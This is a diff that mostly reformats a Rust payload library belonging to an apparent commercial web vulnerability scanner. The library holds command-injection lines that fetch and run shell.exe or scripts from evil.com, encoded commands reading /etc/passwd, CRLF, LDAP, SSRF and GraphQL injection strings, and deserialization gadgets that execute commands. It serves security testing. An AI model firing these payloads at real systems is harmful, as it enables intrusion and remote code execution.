@@ -8,7 +8,6 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
-
 use crate::payloads_comprehensive;
 
 /// XSS Payloads - 100,000+ comprehensive collection
@@ -304,7 +303,8 @@ pub fn get_command_injection_payloads() -> Vec<String> {
     // Windows CMD network operations
     payloads.extend(vec![
         "& certutil -urlcache -split -f http://evil.com/shell.exe".to_string(),
-        "| powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')\"".to_string(),
+        "| powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')\""
+            .to_string(),
         "&& bitsadmin /transfer job http://evil.com/shell.exe C:\\temp\\shell.exe".to_string(),
     ]);
 
@@ -386,13 +386,13 @@ pub fn get_command_injection_payloads() -> Vec<String> {
 
     // Filter bypass - octal encoding
     payloads.extend(vec![
-        "; \\154\\163".to_string(), // ls in octal
+        "; \\154\\163".to_string(),                     // ls in octal
         "; \\167\\150\\157\\141\\155\\151".to_string(), // whoami in octal
     ]);
 
     // Filter bypass - hex encoding
     payloads.extend(vec![
-        "; \\x6c\\x73".to_string(), // ls in hex
+        "; \\x6c\\x73".to_string(),                  // ls in hex
         "; \\x63\\x61\\x74 /etc/passwd".to_string(), // cat in hex
     ]);
 
@@ -609,12 +609,10 @@ pub fn get_ldap_payloads() -> Vec<String> {
         "*)|(objectclass=*",
         "*)|(cn=*",
         "*))%00",
-
         // Tautology
         "*(|(objectclass=*))",
         "*(|(uid=*))",
         "*(|(cn=*))",
-
         // Search filter injection
         "(cn=*)",
         "(uid=*)",
@@ -622,22 +620,18 @@ pub fn get_ldap_payloads() -> Vec<String> {
         "(|(cn=admin)(cn=root))",
         "(&(cn=*)(objectclass=*))",
         "(userPassword=*)",
-
         // DN injection
         "cn=admin",
         "cn=administrator",
         "cn=*,dc=example,dc=com",
-
         // Boolean blind
         "(cn=a*)",
         "(cn=ad*)",
         "(cn=adm*)",
         "(cn=admin*)",
-
         // Error-based
         "(cn=admin))",
         "((cn=admin)",
-
         // Active Directory
         "(adminCount=1)",
         "(userAccountControl:1.2.840.113556.1.4.803:=512)",
@@ -655,37 +649,28 @@ pub fn get_crlf_payloads() -> Vec<String> {
         "%0d%0a",
         "%0D%0A",
         "%0d%0a%0d%0a",
-
         // Set-Cookie injection
         "%0d%0aSet-Cookie: admin=true",
         "%0d%0aSet-Cookie: role=admin; path=/;",
         "%0d%0aSet-Cookie: sessionid=malicious",
-
         // Location header
         "%0d%0aLocation: http://attacker.com/",
         "%0d%0aLocation: //attacker.com/",
-
         // XSS via response splitting
         "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
-
         // Security header bypass
         "%0d%0aX-XSS-Protection: 0",
         "%0d%0aX-Frame-Options: ALLOW",
-
         // CORS headers
         "%0d%0aAccess-Control-Allow-Origin: http://attacker.com",
         "%0d%0aAccess-Control-Allow-Credentials: true",
-
         // Cache poisoning
         "%0d%0aCache-Control: public, max-age=31536000",
-
         // Email header injection
         "%0d%0aBcc: attacker@malicious.com",
         "%0d%0aTo: attacker@malicious.com",
-
         // Log injection
         "%0d%0aINFO: Fake log entry",
-
         // Open redirect
         "%0d%0aRefresh: 0;url=http://attacker.com/",
     ]
@@ -736,8 +721,8 @@ pub fn get_ssrf_payloads() -> Vec<String> {
         "http://127.0.0.1.trafficmanager.net".to_string(),
         "http://localhost.localtest.me".to_string(),
         "http://127.0.0.1.nip.io".to_string(),
-        "http://2130706433".to_string(), // 127.0.0.1 in decimal
-        "http://0x7f000001".to_string(), // 127.0.0.1 in hex
+        "http://2130706433".to_string(),   // 127.0.0.1 in decimal
+        "http://0x7f000001".to_string(),   // 127.0.0.1 in hex
         "http://017700000001".to_string(), // 127.0.0.1 in octal
         "http://0177.0.0.1".to_string(),
         "http://0x7f.0.0.1".to_string(),
@@ -846,9 +831,7 @@ pub fn get_ssrf_payloads() -> Vec<String> {
     ]);
 
     // TFTP protocol
-    payloads.extend(vec![
-        "tftp://127.0.0.1:69".to_string(),
-    ]);
+    payloads.extend(vec!["tftp://127.0.0.1:69".to_string()]);
 
     // SFTP protocol
     payloads.extend(vec![
@@ -879,9 +862,7 @@ pub fn get_ssrf_payloads() -> Vec<String> {
     ]);
 
     // Enclosed alphanumerics bypass
-    payloads.extend(vec![
-        "http://①②⑦.⓪.⓪.①".to_string(),
-    ]);
+    payloads.extend(vec!["http://①②⑦.⓪.⓪.①".to_string()]);
 
     // Rare protocols
     payloads.extend(vec![
@@ -899,20 +880,20 @@ pub fn get_ssrf_payloads() -> Vec<String> {
 
     // Port-specific internal services
     payloads.extend(vec![
-        "http://127.0.0.1:9092".to_string(), // Kafka
-        "http://127.0.0.1:2375".to_string(), // Docker API
-        "http://127.0.0.1:2376".to_string(), // Docker API SSL
-        "http://127.0.0.1:4243".to_string(), // Docker API
-        "http://127.0.0.1:8500".to_string(), // Consul
+        "http://127.0.0.1:9092".to_string(),  // Kafka
+        "http://127.0.0.1:2375".to_string(),  // Docker API
+        "http://127.0.0.1:2376".to_string(),  // Docker API SSL
+        "http://127.0.0.1:4243".to_string(),  // Docker API
+        "http://127.0.0.1:8500".to_string(),  // Consul
         "http://127.0.0.1:10250".to_string(), // Kubelet
         "http://127.0.0.1:10255".to_string(), // Kubelet read-only
-        "http://127.0.0.1:8001".to_string(), // Kubernetes API proxy
-        "http://127.0.0.1:8443".to_string(), // Kubernetes API
+        "http://127.0.0.1:8001".to_string(),  // Kubernetes API proxy
+        "http://127.0.0.1:8443".to_string(),  // Kubernetes API
     ]);
 
     // Docker socket (if exposed via HTTP proxy)
     payloads.extend(vec![
-        "http://unix:/var/run/docker.sock:/containers/json".to_string(),
+        "http://unix:/var/run/docker.sock:/containers/json".to_string()
     ]);
 
     // Kubernetes service discovery
@@ -1056,10 +1037,7 @@ pub fn get_template_injection_payloads() -> Vec<String> {
     ]);
 
     // Go templates
-    payloads.extend(vec![
-        "{{.}}".to_string(),
-        "{{printf \"%s\" .}}".to_string(),
-    ]);
+    payloads.extend(vec!["{{.}}".to_string(), "{{printf \"%s\" .}}".to_string()]);
 
     // Expression Language (Java EE)
     payloads.extend(vec![
@@ -1099,7 +1077,8 @@ pub fn get_graphql_payloads() -> Vec<String> {
 
     // Aliasing (bypass rate limiting)
     payloads.extend(vec![
-        r#"{"query":"query{u1:users{id}u2:users{id}u3:users{id}u4:users{id}u5:users{id}}"}"#.to_string(),
+        r#"{"query":"query{u1:users{id}u2:users{id}u3:users{id}u4:users{id}u5:users{id}}"}"#
+            .to_string(),
     ]);
 
     // Deeply nested queries (DoS)
@@ -1110,7 +1089,8 @@ pub fn get_graphql_payloads() -> Vec<String> {
     // SQL injection in GraphQL arguments
     payloads.extend(vec![
         r#"{"query":"{user(id:\"1' OR '1'='1\"){id,name}}"}"#.to_string(),
-        r#"{"query":"{user(id:\"1 UNION SELECT null,username,password FROM users--\"){id,name}}"}"#.to_string(),
+        r#"{"query":"{user(id:\"1 UNION SELECT null,username,password FROM users--\"){id,name}}"}"#
+            .to_string(),
     ]);
 
     // NoSQL injection in GraphQL
@@ -1121,12 +1101,13 @@ pub fn get_graphql_payloads() -> Vec<String> {
 
     // Directive overloading
     payloads.extend(vec![
-        r#"{"query":"query{users @skip(if:false) @skip(if:false) @skip(if:false){id}}"}"#.to_string(),
+        r#"{"query":"query{users @skip(if:false) @skip(if:false) @skip(if:false){id}}"}"#
+            .to_string(),
     ]);
 
     // Field duplication
     payloads.extend(vec![
-        r#"{"query":"{user{id id id id id name name name}}"}"#.to_string(),
+        r#"{"query":"{user{id id id id id name name name}}"}"#.to_string()
     ]);
 
     // Mutation attacks
@@ -1241,22 +1222,17 @@ pub fn get_file_upload_bypass_payloads() -> Vec<String> {
 pub fn get_deserialization_payloads() -> Vec<String> {
     vec![
         // Java serialized object magic bytes
-        "rO0AB",  // Base64 encoded Java serialized object
-
+        "rO0AB", // Base64 encoded Java serialized object
         // PHP serialize
         r#"O:8:"stdClass":1:{s:4:"test";s:4:"data";}"#,
         r#"O:4:"Evil":1:{s:7:"command";s:6:"whoami";}"#,
-
         // Python pickle
         r#"cos\nsystem\n(S'whoami'\ntR."#,
         r#"c__builtin__\nexec\n(S'import os;os.system("whoami")'\ntR."#,
-
         // PyYAML
         r#"!!python/object/apply:os.system ['whoami']"#,
-
         // Node.js serialize
         r#"{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()"}"#,
-
         // .NET JSON.NET
         r#"{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}"#,
     ]
